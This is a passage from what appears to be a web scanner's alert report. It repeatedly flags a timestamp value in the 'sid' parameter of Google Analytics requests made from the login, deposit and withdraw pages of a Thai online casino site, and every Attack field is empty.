%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=form_start&ep.form_id=&ep.form_name=&ep.form_destination=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&epn.form_length=4&ep.first_field_id=&ep.first_field_name=phone&ep.first_field_type=text&epn.first_field_position=1&_et=8600&tfd=26427
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274189852&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEEAAAQ&_s=4&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=form_submit&ep.form_id=&ep.form_name=&ep.form_destination=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&epn.form_length=4&_et=11844&tfd=34429
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274189852&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_s=1&sid=1754274189&sct=1&seg=0&dl=https%3A%2F%2Fmember.panama8888b.com%2Fauth%2Flogin&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_fv=1&_nsi=1&_ss=1&_ee=1&tfd=4948
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274219949&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113531&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=6673
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274219949&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105113531&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=2&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=8231&tfd=9916
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274228652&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=2864
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274228652&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=2416&tfd=5293
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274228652&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=2085&tfd=5292
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274233558&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=2164
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274233558&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=33794&tfd=320922
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274233558&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=1423&tfd=7172
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274555034&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0